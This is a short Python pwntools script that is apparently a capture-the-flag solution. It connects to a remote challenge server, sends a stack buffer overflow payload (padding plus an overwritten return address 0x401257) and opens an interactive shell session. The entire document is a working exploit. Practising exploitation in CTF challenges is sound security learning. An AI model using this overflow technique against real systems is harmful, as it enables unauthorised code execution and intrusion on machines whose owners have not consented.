from pwn import *

context.gdb_binary = "/bin/pwndbg"

# io = process("./pwn")
io = remote("node5.anna.nssctf.cn", 27519)

fun_addr = 0x401257
payload = b"a" * (0x20 + 8) + p64(fun_addr)
io.sendline(payload)
io.interactive()
